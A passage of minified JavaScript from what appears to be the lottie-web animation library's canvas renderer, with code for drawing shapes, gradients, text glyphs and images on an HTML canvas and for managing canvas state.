                    : ((vt = ShapeModifiers.getModifier(i[nt].ty)),
                      vt.init(this, i[nt]),
                      (a[nt] = vt),
                      this.shapeModifiers.push(vt)),
                  gt.push(vt))
                : i[nt].ty === "rp" &&
                  (St
                    ? ((vt = a[nt]), (vt.closed = !0))
                    : ((vt = ShapeModifiers.getModifier(i[nt].ty)),
                      (a[nt] = vt),
                      vt.init(this, i, nt, a),
                      this.shapeModifiers.push(vt),
                      (s = !1)),
                  gt.push(vt));
            this.addProcessedElement(i[nt], nt + 1);
          }
          for (
            this.removeTransformFromStyleList(),
              this.closeStyles(ht),
              ot = gt.length,
              nt = 0;
            nt < ot;
            nt += 1
          )
            gt[nt].closed = !0;
        }),
        (CVShapeElement.prototype.renderInnerContent = function () {
          (this.transformHelper.opacity = 1),
            (this.transformHelper._opMdf = !1),
            this.renderModifiers(),
            this.transformsManager.processSequences(this._isFirstFrame),
            this.renderShape(
              this.transformHelper,
              this.shapesData,
              this.itemsData,
              !0
            );
        }),
        (CVShapeElement.prototype.renderShapeTransform = function (i, a) {
          (i._opMdf || a.op._mdf || this._isFirstFrame) &&
            ((a.opacity = i.opacity), (a.opacity *= a.op.v), (a._opMdf = !0));
        }),
        (CVShapeElement.prototype.drawLayer = function () {
          var i,
            a = this.stylesList.length,
            o,
            s,
            tt,
            nt,
            ot,
            st,
            ft = this.globalData.renderer,
            ht = this.globalData.canvasContext,
            gt,
            St;
          for (i = 0; i < a; i += 1)
            if (
              ((St = this.stylesList[i]),
              (gt = St.type),
              !(
                ((gt === "st" || gt === "gs") && St.wi === 0) ||
                !St.data._shouldRender ||
                St.coOp === 0 ||
                this.globalData.currentGlobalAlpha === 0
              ))
            ) {
              for (
                ft.save(),
                  ot = St.elements,
                  gt === "st" || gt === "gs"
                    ? (ft.ctxStrokeStyle(gt === "st" ? St.co : St.grd),
                      ft.ctxLineWidth(St.wi),
                      ft.ctxLineCap(St.lc),
                      ft.ctxLineJoin(St.lj),
                      ft.ctxMiterLimit(St.ml || 0))
                    : ft.ctxFillStyle(gt === "fl" ? St.co : St.grd),
                  ft.ctxOpacity(St.coOp),
                  gt !== "st" && gt !== "gs" && ht.beginPath(),
                  ft.ctxTransform(St.preTransforms.finalTransform.props),
                  s = ot.length,
                  o = 0;
                o < s;
                o += 1
              ) {
                for (
                  (gt === "st" || gt === "gs") &&
                    (ht.beginPath(),
                    St.da &&
                      (ht.setLineDash(St.da), (ht.lineDashOffset = St.do))),
                    st = ot[o].trNodes,
                    nt = st.length,
                    tt = 0;
                  tt < nt;
                  tt += 1
                )
                  st[tt].t === "m"
                    ? ht.moveTo(st[tt].p[0], st[tt].p[1])
                    : st[tt].t === "c"
                    ? ht.bezierCurveTo(
                        st[tt].pts[0],
                        st[tt].pts[1],
                        st[tt].pts[2],
                        st[tt].pts[3],
                        st[tt].pts[4],
                        st[tt].pts[5]
                      )
                    : ht.closePath();
                (gt === "st" || gt === "gs") &&
                  (ft.ctxStroke(), St.da && ht.setLineDash(this.dashResetter));
              }
              gt !== "st" &&
                gt !== "gs" &&
                this.globalData.renderer.ctxFill(St.r),
                ft.restore();
            }
        }),
        (CVShapeElement.prototype.renderShape = function (i, a, o, s) {
          var tt,
            nt = a.length - 1,
            ot;
          for (ot = i, tt = nt; tt >= 0; tt -= 1)
            a[tt].ty === "tr"
              ? ((ot = o[tt].transform), this.renderShapeTransform(i, ot))
              : a[tt].ty === "sh" ||
                a[tt].ty === "el" ||
                a[tt].ty === "rc" ||
                a[tt].ty === "sr"
              ? this.renderPath(a[tt], o[tt])
              : a[tt].ty === "fl"
              ? this.renderFill(a[tt], o[tt], ot)
              : a[tt].ty === "st"
              ? this.renderStroke(a[tt], o[tt], ot)
              : a[tt].ty === "gf" || a[tt].ty === "gs"
              ? this.renderGradientFill(a[tt], o[tt], ot)
              : a[tt].ty === "gr"
              ? this.renderShape(ot, a[tt].it, o[tt].it)
              : a[tt].ty;
          s && this.drawLayer();
        }),
        (CVShapeElement.prototype.renderStyledShape = function (i, a) {
          if (this._isFirstFrame || a._mdf || i.transforms._mdf) {
            var o = i.trNodes,
              s = a.paths,
              tt,
              nt,
              ot,
              st = s._length;
            o.length = 0;
            var ft = i.transforms.finalTransform;
            for (ot = 0; ot < st; ot += 1) {
              var ht = s.shapes[ot];
              if (ht && ht.v) {
                for (nt = ht._length, tt = 1; tt < nt; tt += 1)
                  tt === 1 &&
                    o.push({
                      t: "m",
                      p: ft.applyToPointArray(ht.v[0][0], ht.v[0][1], 0),
                    }),
                    o.push({
                      t: "c",
                      pts: ft.applyToTriplePoints(
                        ht.o[tt - 1],
                        ht.i[tt],
                        ht.v[tt]
                      ),
                    });
                nt === 1 &&
                  o.push({
                    t: "m",
                    p: ft.applyToPointArray(ht.v[0][0], ht.v[0][1], 0),
                  }),
                  ht.c &&
                    nt &&
                    (o.push({
                      t: "c",
                      pts: ft.applyToTriplePoints(
                        ht.o[tt - 1],
                        ht.i[0],
                        ht.v[0]
                      ),
                    }),
                    o.push({ t: "z" }));
              }
            }
            i.trNodes = o;
          }
        }),
        (CVShapeElement.prototype.renderPath = function (i, a) {
          if (i.hd !== !0 && i._shouldRender) {
            var o,
              s = a.styledShapes.length;
            for (o = 0; o < s; o += 1)
              this.renderStyledShape(a.styledShapes[o], a.sh);
          }
        }),
        (CVShapeElement.prototype.renderFill = function (i, a, o) {
          var s = a.style;
          (a.c._mdf || this._isFirstFrame) &&
            (s.co =
              "rgb(" +
              bmFloor(a.c.v[0]) +
              "," +
              bmFloor(a.c.v[1]) +
              "," +
              bmFloor(a.c.v[2]) +
              ")"),
            (a.o._mdf || o._opMdf || this._isFirstFrame) &&
              (s.coOp = a.o.v * o.opacity);
        }),
        (CVShapeElement.prototype.renderGradientFill = function (i, a, o) {
          var s = a.style,
            tt;
          if (
            !s.grd ||
            a.g._mdf ||
            a.s._mdf ||
            a.e._mdf ||
            (i.t !== 1 && (a.h._mdf || a.a._mdf))
          ) {
            var nt = this.globalData.canvasContext,
              ot = a.s.v,
              st = a.e.v;
            if (i.t === 1)
              tt = nt.createLinearGradient(ot[0], ot[1], st[0], st[1]);
            else {
              var ft = Math.sqrt(
                  Math.pow(ot[0] - st[0], 2) + Math.pow(ot[1] - st[1], 2)
                ),
                ht = Math.atan2(st[1] - ot[1], st[0] - ot[0]),
                gt = a.h.v;
              gt >= 1 ? (gt = 0.99) : gt <= -1 && (gt = -0.99);
              var St = ft * gt,
                vt = Math.cos(ht + a.a.v) * St + ot[0],
                _t = Math.sin(ht + a.a.v) * St + ot[1];
              tt = nt.createRadialGradient(vt, _t, 0, ot[0], ot[1], ft);
            }
            var Et,
              Ct = i.g.p,
              Pt = a.g.c,
              bt = 1;
            for (Et = 0; Et < Ct; Et += 1)
              a.g._hasOpacity && a.g._collapsable && (bt = a.g.o[Et * 2 + 1]),
                tt.addColorStop(
                  Pt[Et * 4] / 100,
                  "rgba(" +
                    Pt[Et * 4 + 1] +
                    "," +
                    Pt[Et * 4 + 2] +
                    "," +
                    Pt[Et * 4 + 3] +
                    "," +
                    bt +
                    ")"
                );
            s.grd = tt;
          }
          s.coOp = a.o.v * o.opacity;
        }),
        (CVShapeElement.prototype.renderStroke = function (i, a, o) {
          var s = a.style,
            tt = a.d;
          tt &&
            (tt._mdf || this._isFirstFrame) &&
            ((s.da = tt.dashArray), (s.do = tt.dashoffset[0])),
            (a.c._mdf || this._isFirstFrame) &&
              (s.co =
                "rgb(" +
                bmFloor(a.c.v[0]) +
                "," +
                bmFloor(a.c.v[1]) +
                "," +
                bmFloor(a.c.v[2]) +
                ")"),
            (a.o._mdf || o._opMdf || this._isFirstFrame) &&
              (s.coOp = a.o.v * o.opacity),
            (a.w._mdf || this._isFirstFrame) && (s.wi = a.w.v);
        }),
        (CVShapeElement.prototype.destroy = function () {
          (this.shapesData = null),
            (this.globalData = null),
            (this.canvasContext = null),
            (this.stylesList.length = 0),
            (this.itemsData.length = 0);
        });
      function CVTextElement(i, a, o) {
        (this.textSpans = []),
          (this.yOffset = 0),
          (this.fillColorAnim = !1),
          (this.strokeColorAnim = !1),
          (this.strokeWidthAnim = !1),
          (this.stroke = !1),
          (this.fill = !1),
          (this.justifyOffset = 0),
          (this.currentRender = null),
          (this.renderType = "canvas"),
          (this.values = {
            fill: "rgba(0,0,0,0)",
            stroke: "rgba(0,0,0,0)",
            sWidth: 0,
            fValue: "",
          }),
          this.initElement(i, a, o);
      }
      extendPrototype(
        [
          BaseElement,
          TransformElement,
          CVBaseElement,
          HierarchyElement,
          FrameElement,
          RenderableElement,
          ITextElement,
        ],
        CVTextElement
      ),
        (CVTextElement.prototype.tHelper =
          createTag("canvas").getContext("2d")),
        (CVTextElement.prototype.buildNewText = function () {
          var i = this.textProperty.currentData;
          this.renderedLetters = createSizedArray(i.l ? i.l.length : 0);
          var a = !1;
          i.fc
            ? ((a = !0), (this.values.fill = this.buildColor(i.fc)))
            : (this.values.fill = "rgba(0,0,0,0)"),
            (this.fill = a);
          var o = !1;
          i.sc &&
            ((o = !0),
            (this.values.stroke = this.buildColor(i.sc)),
            (this.values.sWidth = i.sw));
          var s = this.globalData.fontManager.getFontByName(i.f),
            tt,
            nt,
            ot = i.l,
            st = this.mHelper;
          (this.stroke = o),
            (this.values.fValue =
              i.finalSize +
              "px " +
              this.globalData.fontManager.getFontByName(i.f).fFamily),
            (nt = i.finalText.length);
          var ft,
            ht,
            gt,
            St,
            vt,
            _t,
            Et,
            Ct,
            Pt,
            bt,
            xt = this.data.singleShape,
            yt = i.tr * 0.001 * i.finalSize,
            wt = 0,
            $t = 0,
            kt = !0,
            Rt = 0;
          for (tt = 0; tt < nt; tt += 1) {
            (ft = this.globalData.fontManager.getCharData(
              i.finalText[tt],
              s.fStyle,
              this.globalData.fontManager.getFontByName(i.f).fFamily
            )),
              (ht = (ft && ft.data) || {}),
              st.reset(),
              xt &&
                ot[tt].n &&
                ((wt = -yt), ($t += i.yOffset), ($t += kt ? 1 : 0), (kt = !1)),
              (vt = ht.shapes ? ht.shapes[0].it : []),
              (Et = vt.length),
              st.scale(i.finalSize / 100, i.finalSize / 100),
              xt &&
                this.applyTextPropertiesToMatrix(i, st, ot[tt].line, wt, $t),
              (Pt = createSizedArray(Et - 1));
            var It = 0;
            for (_t = 0; _t < Et; _t += 1)
              if (vt[_t].ty === "sh") {
                for (
                  St = vt[_t].ks.k.i.length, Ct = vt[_t].ks.k, bt = [], gt = 1;
                  gt < St;
                  gt += 1
                )
                  gt === 1 &&
                    bt.push(
                      st.applyToX(Ct.v[0][0], Ct.v[0][1], 0),
                      st.applyToY(Ct.v[0][0], Ct.v[0][1], 0)
                    ),
                    bt.push(
                      st.applyToX(Ct.o[gt - 1][0], Ct.o[gt - 1][1], 0),
                      st.applyToY(Ct.o[gt - 1][0], Ct.o[gt - 1][1], 0),
                      st.applyToX(Ct.i[gt][0], Ct.i[gt][1], 0),
                      st.applyToY(Ct.i[gt][0], Ct.i[gt][1], 0),
                      st.applyToX(Ct.v[gt][0], Ct.v[gt][1], 0),
                      st.applyToY(Ct.v[gt][0], Ct.v[gt][1], 0)
                    );
                bt.push(
                  st.applyToX(Ct.o[gt - 1][0], Ct.o[gt - 1][1], 0),
                  st.applyToY(Ct.o[gt - 1][0], Ct.o[gt - 1][1], 0),
                  st.applyToX(Ct.i[0][0], Ct.i[0][1], 0),
                  st.applyToY(Ct.i[0][0], Ct.i[0][1], 0),
                  st.applyToX(Ct.v[0][0], Ct.v[0][1], 0),
                  st.applyToY(Ct.v[0][0], Ct.v[0][1], 0)
                ),
                  (Pt[It] = bt),
                  (It += 1);
              }
            xt && ((wt += ot[tt].l), (wt += yt)),
              this.textSpans[Rt]
                ? (this.textSpans[Rt].elem = Pt)
                : (this.textSpans[Rt] = { elem: Pt }),
              (Rt += 1);
          }
        }),
        (CVTextElement.prototype.renderInnerContent = function () {
          this.validateText();
          var i = this.canvasContext;
          (i.font = this.values.fValue),
            this.globalData.renderer.ctxLineCap("butt"),
            this.globalData.renderer.ctxLineJoin("miter"),
            this.globalData.renderer.ctxMiterLimit(4),
            this.data.singleShape ||
              this.textAnimator.getMeasures(
                this.textProperty.currentData,
                this.lettersChangedFlag
              );
          var a,
            o,
            s,
            tt,
            nt,
            ot,
            st = this.textAnimator.renderedLetters,
            ft = this.textProperty.currentData.l;
          o = ft.length;
          var ht,
            gt = null,
            St = null,
            vt = null,
            _t,
            Et,
            Ct = this.globalData.renderer;
          for (a = 0; a < o; a += 1)
            if (!ft[a].n) {
              if (
                ((ht = st[a]),
                ht && (Ct.save(), Ct.ctxTransform(ht.p), Ct.ctxOpacity(ht.o)),
                this.fill)
              ) {
                for (
                  ht && ht.fc
                    ? gt !== ht.fc && (Ct.ctxFillStyle(ht.fc), (gt = ht.fc))
                    : gt !== this.values.fill &&
                      ((gt = this.values.fill),
                      Ct.ctxFillStyle(this.values.fill)),
                    _t = this.textSpans[a].elem,
                    tt = _t.length,
                    this.globalData.canvasContext.beginPath(),
                    s = 0;
                  s < tt;
                  s += 1
                )
                  for (
                    Et = _t[s],
                      ot = Et.length,
                      this.globalData.canvasContext.moveTo(Et[0], Et[1]),
                      nt = 2;
                    nt < ot;
                    nt += 6
                  )
                    this.globalData.canvasContext.bezierCurveTo(
                      Et[nt],
                      Et[nt + 1],
                      Et[nt + 2],
                      Et[nt + 3],
                      Et[nt + 4],
                      Et[nt + 5]
                    );
                this.globalData.canvasContext.closePath(), Ct.ctxFill();
              }
              if (this.stroke) {
                for (
                  ht && ht.sw
                    ? vt !== ht.sw && ((vt = ht.sw), Ct.ctxLineWidth(ht.sw))
                    : vt !== this.values.sWidth &&
                      ((vt = this.values.sWidth),
                      Ct.ctxLineWidth(this.values.sWidth)),
                    ht && ht.sc
                      ? St !== ht.sc && ((St = ht.sc), Ct.ctxStrokeStyle(ht.sc))
                      : St !== this.values.stroke &&
                        ((St = this.values.stroke),
                        Ct.ctxStrokeStyle(this.values.stroke)),
                    _t = this.textSpans[a].elem,
                    tt = _t.length,
                    this.globalData.canvasContext.beginPath(),
                    s = 0;
                  s < tt;
                  s += 1
                )
                  for (
                    Et = _t[s],
                      ot = Et.length,
                      this.globalData.canvasContext.moveTo(Et[0], Et[1]),
                      nt = 2;
                    nt < ot;
                    nt += 6
                  )
                    this.globalData.canvasContext.bezierCurveTo(
                      Et[nt],
                      Et[nt + 1],
                      Et[nt + 2],
                      Et[nt + 3],
                      Et[nt + 4],
                      Et[nt + 5]
                    );
                this.globalData.canvasContext.closePath(), Ct.ctxStroke();
              }
              ht && this.globalData.renderer.restore();
            }
        });
      function CVImageElement(i, a, o) {
        (this.assetData = a.getAssetData(i.refId)),
          (this.img = a.imageLoader.getAsset(this.assetData)),
          this.initElement(i, a, o);
      }
      extendPrototype(
        [
          BaseElement,
          TransformElement,
          CVBaseElement,
          HierarchyElement,
          FrameElement,
          RenderableElement,
        ],
        CVImageElement
      ),
        (CVImageElement.prototype.initElement =
          SVGShapeElement.prototype.initElement),
        (CVImageElement.prototype.prepareFrame =
          IImageElement.prototype.prepareFrame),
        (CVImageElement.prototype.createContent = function () {
          if (
            this.img.width &&
            (this.assetData.w !== this.img.width ||
              this.assetData.h !== this.img.height)
          ) {
            var i = createTag("canvas");
            (i.width = this.assetData.w), (i.height = this.assetData.h);
            var a = i.getContext("2d"),
              o = this.img.width,
              s = this.img.height,
              tt = o / s,
              nt = this.assetData.w / this.assetData.h,
              ot,
              st,
              ft =
                this.assetData.pr ||
                this.globalData.renderConfig.imagePreserveAspectRatio;
            (tt > nt && ft === "xMidYMid slice") ||
            (tt < nt && ft !== "xMidYMid slice")
              ? ((st = s), (ot = st * nt))
              : ((ot = o), (st = ot / nt)),
              a.drawImage(
                this.img,
                (o - ot) / 2,
                (s - st) / 2,
                ot,
                st,
                0,
                0,
                this.assetData.w,
                this.assetData.h
              ),
              (this.img = i);
          }
        }),
        (CVImageElement.prototype.renderInnerContent = function () {
          this.canvasContext.drawImage(this.img, 0, 0);
        }),
        (CVImageElement.prototype.destroy = function () {
          this.img = null;
        });
      function CVSolidElement(i, a, o) {
        this.initElement(i, a, o);
      }
      extendPrototype(
        [
          BaseElement,
          TransformElement,
          CVBaseElement,
          HierarchyElement,
          FrameElement,
          RenderableElement,
        ],
        CVSolidElement
      ),
        (CVSolidElement.prototype.initElement =
          SVGShapeElement.prototype.initElement),
        (CVSolidElement.prototype.prepareFrame =
          IImageElement.prototype.prepareFrame),
        (CVSolidElement.prototype.renderInnerContent = function () {
          this.globalData.renderer.ctxFillStyle(this.data.sc),
            this.globalData.renderer.ctxFillRect(
              0,
              0,
              this.data.sw,
              this.data.sh
            );
        });
      function CanvasRendererBase() {}
      extendPrototype([BaseRenderer], CanvasRendererBase),
        (CanvasRendererBase.prototype.createShape = function (i) {
          return new CVShapeElement(i, this.globalData, this);
        }),
        (CanvasRendererBase.prototype.createText = function (i) {
          return new CVTextElement(i, this.globalData, this);
        }),
        (CanvasRendererBase.prototype.createImage = function (i) {
          return new CVImageElement(i, this.globalData, this);
        }),
        (CanvasRendererBase.prototype.createSolid = function (i) {
          return new CVSolidElement(i, this.globalData, this);
        }),
        (CanvasRendererBase.prototype.createNull =
          SVGRenderer.prototype.createNull),
        (CanvasRendererBase.prototype.ctxTransform = function (i) {
          (i[0] === 1 &&
            i[1] === 0 &&
            i[4] === 0 &&
            i[5] === 1 &&
            i[12] === 0 &&
            i[13] === 0) ||
            this.canvasContext.transform(i[0], i[1], i[4], i[5], i[12], i[13]);
        }),
        (CanvasRendererBase.prototype.ctxOpacity = function (i) {
          this.canvasContext.globalAlpha *= i < 0 ? 0 : i;
        }),
        (CanvasRendererBase.prototype.ctxFillStyle = function (i) {
          this.canvasContext.fillStyle = i;
        }),
        (CanvasRendererBase.prototype.ctxStrokeStyle = function (i) {
          this.canvasContext.strokeStyle = i;
        }),
        (CanvasRendererBase.prototype.ctxLineWidth = function (i) {
          this.canvasContext.lineWidth = i;
        }),
        (CanvasRendererBase.prototype.ctxLineCap = function (i) {
          this.canvasContext.lineCap = i;
        }),
        (CanvasRendererBase.prototype.ctxLineJoin = function (i) {
          this.canvasContext.lineJoin = i;
        }),
        (CanvasRendererBase.prototype.ctxMiterLimit = function (i) {
          this.canvasContext.miterLimit = i;
        }),
        (CanvasRendererBase.prototype.ctxFill = function (i) {
          this.canvasContext.fill(i);
        }),
        (CanvasRendererBase.prototype.ctxFillRect = function (i, a, o, s) {
          this.canvasContext.fillRect(i, a, o, s);
        }),
        (CanvasRendererBase.prototype.ctxStroke = function () {
          this.canvasContext.stroke();
        }),
        (CanvasRendererBase.prototype.reset = function () {
          if (!this.renderConfig.clearCanvas) {
            this.canvasContext.restore();
            return;
          }
          this.contextData.reset();
        }),
        (CanvasRendererBase.prototype.save = function () {
          this.canvasContext.save();
        }),
        (CanvasRendererBase.prototype.restore = function (i) {
          if (!this.renderConfig.clearCanvas) {
            this.canvasContext.restore();
            return;
          }
          i && (this.globalData.blendMode = "source-over"),
            this.contextData.restore(i);
        }),
        (CanvasRendererBase.prototype.configAnimation = function (i) {
          if (this.animationItem.wrapper) {
            this.animationItem.container = createTag("canvas");
            var a = this.animationItem.container.style;
            (a.width = "100%"), (a.height = "100%");
            var o = "0px 0px 0px";
            (a.transformOrigin = o),
              (a.mozTransformOrigin = o),
              (a.webkitTransformOrigin = o),
              (a["-webkit-transform"] = o),
              (a.contentVisibility = this.renderConfig.contentVisibility),
              this.animationItem.wrapper.appendChild(
                this.animationItem.container
              ),
              (this.canvasContext =
                this.animationItem.container.getContext("2d")),
              this.renderConfig.className &&
                this.animationItem.container.setAttribute(
                  "class",
                  this.renderConfig.className
                ),
              this.renderConfig.id &&
                this.animationItem.container.setAttribute(
                  "id",
                  this.renderConfig.id
                );
          } else this.canvasContext = this.renderConfig.context;
          this.contextData.setContext(this.canvasContext),
            (this.data = i),
            (this.layers = i.layers),
            (this.transformCanvas = {
              w: i.w,
              h: i.h,
              sx: 0,
              sy: 0,
              tx: 0,
              ty: 0,
            }),
            this.setupGlobalData(i, document.body),
            (this.globalData.canvasContext = this.canvasContext),
            (this.globalData.renderer = this),
            (this.globalData.isDashed = !1),
            (this.globalData.progressiveLoad =
              this.renderConfig.progressiveLoad),
            (this.globalData.transformCanvas = this.transformCanvas),
            (this.elements = createSizedArray(i.layers.length)),
            this.updateContainerSize();
        }),
        (CanvasRendererBase.prototype.updateContainerSize = function (i, a) {
          this.reset();
          var o, s;
          i
            ? ((o = i),
              (s = a),
              (this.canvasContext.canvas.width = o),
              (this.canvasContext.canvas.height = s))
            : (this.animationItem.wrapper && this.animationItem.container
                ? ((o = this.animationItem.wrapper.offsetWidth),
                  (s = this.animationItem.wrapper.offsetHeight))
                : ((o = this.canvasContext.canvas.width),
                  (s = this.canvasContext.canvas.height)),
              (this.canvasContext.canvas.width = o * this.renderConfig.dpr),
              (this.canvasContext.canvas.height = s * this.renderConfig.dpr));
          var tt, nt;
          if (
            this.renderConfig.preserveAspectRatio.indexOf("meet") !== -1 ||
            this.renderConfig.preserveAspectRatio.indexOf("slice") !== -1
          ) {
            var ot = this.renderConfig.preserveAspectRatio.split(" "),
              st = ot[1] || "meet",
              ft = ot[0] || "xMidYMid",
              ht = ft.substr(0, 4),
              gt = ft.substr(4);
            (tt = o / s),
              (nt = this.transformCanvas.w / this.transformCanvas.h),
              (nt > tt && st === "meet") || (nt < tt && st === "slice")
                ? ((this.transformCanvas.sx =
                    o / (this.transformCanvas.w / this.renderConfig.dpr)),
                  (this.transformCanvas.sy =
                    o / (this.transformCanvas.w / this.renderConfig.dpr)))
                : ((this.transformCanvas.sx =
                    s / (this.transformCanvas.h / this.renderConfig.dpr)),
                  (this.transformCanvas.sy =
                    s / (this.transformCanvas.h / this.renderConfig.dpr))),
              ht === "xMid" &&
              ((nt < tt && st === "meet") || (nt > tt && st === "slice"))
                ? (this.transformCanvas.tx =
                    ((o -
                      this.transformCanvas.w * (s / this.transformCanvas.h)) /
                      2) *
                    this.renderConfig.dpr)
                : ht === "xMax" &&
                  ((nt < tt && st === "meet") || (nt > tt && st === "slice"))
                ? (this.transformCanvas.tx =
                    (o -
                      this.transformCanvas.w * (s / this.transformCanvas.h)) *
                    this.renderConfig.dpr)
                : (this.transformCanvas.tx = 0),
              gt === "YMid" &&
              ((nt > tt && st === "meet") || (nt < tt && st === "slice"))
                ? (this.transformCanvas.ty =
                    ((s -
                      this.transformCanvas.h * (o / this.transformCanvas.w)) /
                      2) *
                    this.renderConfig.dpr)
                : gt === "YMax" &&
                  ((nt > tt && st === "meet") || (nt < tt && st === "slice"))
                ? (this.transformCanvas.ty =
                    (s -
                      this.transformCanvas.h * (o / this.transformCanvas.w)) *
                    this.renderConfig.dpr)
                : (this.transformCanvas.ty = 0);
          } else
            this.renderConfig.preserveAspectRatio === "none"
              ? ((this.transformCanvas.sx =
                  o / (this.transformCanvas.w / this.renderConfig.dpr)),
                (this.transformCanvas.sy =
                  s / (this.transformCanvas.h / this.renderConfig.dpr)),
                (this.transformCanvas.tx = 0),
                (this.transformCanvas.ty = 0))
              : ((this.transformCanvas.sx = this.renderConfig.dpr),
                (this.transformCanvas.sy = this.renderConfig.dpr),
                (this.transformCanvas.tx = 0),
                (this.transformCanvas.ty = 0));
          (this.transformCanvas.props = [
            this.transformCanvas.sx,
            0,
            0,
            0,
            0,
            this.transformCanvas.sy,
            0,
            0,
            0,
            0,
            1,
            0,
            this.transformCanvas.tx,
            this.transformCanvas.ty,
            0,
            1,
          ]),
            this.ctxTransform(this.transformCanvas.props),
            this.canvasContext.beginPath(),
            this.canvasContext.rect(
              0,
              0,
              this.transformCanvas.w,
              this.transformCanvas.h
            ),
            this.canvasContext.closePath(),
            this.canvasContext.clip(),
            this.renderFrame(this.renderedFrame, !0);
        }),
        (CanvasRendererBase.prototype.destroy = function () {
          this.renderConfig.clearCanvas &&
            this.animationItem.wrapper &&
            (this.animationItem.wrapper.innerText = "");
          var i,
            a = this.layers ? this.layers.length : 0;
          for (i = a - 1; i >= 0; i -= 1)
            this.elements[i] &&
              this.elements[i].destroy &&
              this.elements[i].destroy();
          (this.elements.length = 0),
            (this.globalData.canvasContext = null),
            (this.animationItem.container = null),
            (this.destroyed = !0);
        }),
        (CanvasRendererBase.prototype.renderFrame = function (i, a) {
          if (
            !(
              (this.renderedFrame === i &&
                this.renderConfig.clearCanvas === !0 &&
                !a) ||
              this.destroyed ||
              i === -1
            )
          ) {
            (this.renderedFrame = i),
              (this.globalData.frameNum = i - this.animationItem._isFirstFrame),
              (this.globalData.frameId += 1),
              (this.globalData._mdf = !this.renderConfig.clearCanvas || a),
              (this.globalData.projectInterface.currentFrame = i);
            var o,
              s = this.layers.length;
            for (
              this.completeLayers || this.checkLayers(i), o = s - 1;
              o >= 0;
              o -= 1
            )
              (this.completeLayers || this.elements[o]) &&
                this.elements[o].prepareFrame(i - this.layers[o].st);
            if (this.globalData._mdf) {
              for (
                this.renderConfig.clearCanvas === !0
                  ? this.canvasContext.clearRect(
                      0,
                      0,
                      this.transformCanvas.w,
                      this.transformCanvas.h
                    )
                  : this.save(),
                  o = s - 1;
                o >= 0;
                o -= 1
              )
                (this.completeLayers || this.elements[o]) &&
                  this.elements[o].renderFrame();
              this.renderConfig.clearCanvas !== !0 && this.restore();
            }
          }
        }),
        (CanvasRendererBase.prototype.buildItem = function (i) {
          var a = this.elements;
          if (!(a[i] || this.layers[i].ty === 99)) {
            var o = this.createItem(this.layers[i], this, this.globalData);
            (a[i] = o), o.initExpressions();
          }
        }),
        (CanvasRendererBase.prototype.checkPendingElements = function () {
          for (; this.pendingElements.length; ) {
            var i = this.pendingElements.pop();
            i.checkParenting();
          }
        }),
        (CanvasRendererBase.prototype.hide = function () {
          this.animationItem.container.style.display = "none";
        }),
        (CanvasRendererBase.prototype.show = function () {
          this.animationItem.container.style.display = "block";
        });
      function CanvasContext() {
        (this.opacity = -1),
          (this.transform = createTypedArray("float32", 16)),
          (this.fillStyle = ""),
          (this.strokeStyle = ""),
          (this.lineWidth = ""),
          (this.lineCap = ""),
          (this.lineJoin = ""),
          (this.miterLimit = ""),
          (this.id = Math.random());
      }
      function CVContextData() {
        (this.stack = []), (this.cArrPos = 0), (this.cTr = new Matrix());
        var i,
          a = 15;
        for (i = 0; i < a; i += 1) {
          var o = new CanvasContext();
          this.stack[i] = o;
        }
        (this._length = a),
          (this.nativeContext = null),
          (this.transformMat = new Matrix()),
          (this.currentOpacity = 1),
          (this.currentFillStyle = ""),
          (this.appliedFillStyle = ""),
          (this.currentStrokeStyle = ""),
          (this.appliedStrokeStyle = ""),
          (this.currentLineWidth = ""),
          (this.appliedLineWidth = ""),
          (this.currentLineCap = ""),
          (this.appliedLineCap = ""),
          (this.currentLineJoin = ""),
          (this.appliedLineJoin = ""),
          (this.appliedMiterLimit = ""),
          (this.currentMiterLimit = "");
      }
      (CVContextData.prototype.duplicate = function () {
        var i = this._length * 2,
          a = 0;
        for (a = this._length; a < i; a += 1)
          this.stack[a] = new CanvasContext();
        this._length = i;
      }),
        (CVContextData.prototype.reset = function () {
          (this.cArrPos = 0),
            this.cTr.reset(),
            (this.stack[this.cArrPos].opacity = 1);
        }),
        (CVContextData.prototype.restore = function (i) {
          this.cArrPos -= 1;
          var a = this.stack[this.cArrPos],
            o = a.transform,
            s,
            tt = this.cTr.props;
          for (s = 0; s < 16; s += 1) tt[s] = o[s];
          if (i) {
            this.nativeContext.restore();
            var nt = this.stack[this.cArrPos + 1];
            (this.appliedFillStyle = nt.fillStyle),
              (this.appliedStrokeStyle = nt.strokeStyle),
              (this.appliedLineWidth = nt.lineWidth),
              (this.appliedLineCap = nt.lineCap),
              (this.appliedLineJoin = nt.lineJoin),
              (this.appliedMiterLimit = nt.miterLimit);
          }
          this.nativeContext.setTransform(o[0], o[1], o[4], o[5], o[12], o[13]),
            (i || (a.opacity !== -1 && this.currentOpacity !== a.opacity)) &&
              ((this.nativeContext.globalAlpha = a.opacity),
              (this.currentOpacity = a.opacity)),
            (this.currentFillStyle = a.fillStyle),
            (this.currentStrokeStyle = a.strokeStyle),
            (this.currentLineWidth = a.lineWidth),
            (this.currentLineCap = a.lineCap),
            (this.currentLineJoin = a.lineJoin),
            (this.currentMiterLimit = a.miterLimit);
        }),
        (CVContextData.prototype.save = function (i) {
          i && this.nativeContext.save();
          var a = this.cTr.props;
          this._length <= this.cArrPos && this.duplicate();
          var o = this.stack[this.cArrPos],
            s;
          for (s = 0; s < 16; s += 1) o.transform[s] = a[s];
          this.cArrPos += 1;
          var tt = this.stack[this.cArrPos];
          (tt.opacity = o.opacity),
            (tt.fillStyle = o.fillStyle),
            (tt.strokeStyle = o.strokeStyle),
            (tt.lineWidth = o.lineWidth),
            (tt.lineCap = o.lineCap),
            (tt.lineJoin = o.lineJoin),
            (tt.miterLimit = o.miterLimit);
        }),
        (CVContextData.prototype.setOpacity = function (i) {
          this.stack[this.cArrPos].opacity = i;
        }),
        (CVContextData.prototype.setContext = function (i) {
          this.nativeContext = i;
        }),
        (CVContextData.prototype.fillStyle = function (i) {
          this.stack[this.cArrPos].fillStyle !== i &&
            ((this.currentFillStyle = i),
            (this.stack[this.cArrPos].fillStyle = i));
        }),
        (CVContextData.prototype.strokeStyle = function (i) {
          this.stack[this.cArrPos].strokeStyle !== i &&
            ((this.currentStrokeStyle = i),
            (this.stack[this.cArrPos].strokeStyle = i));
        }),
        (CVContextData.prototype.lineWidth = function (i) {
          this.stack[this.cArrPos].lineWidth !== i &&
            ((this.currentLineWidth = i),
            (this.stack[this.cArrPos].lineWidth = i));
        }),
        (CVContextData.prototype.lineCap = function (i) {
          this.stack[this.cArrPos].lineCap !== i &&
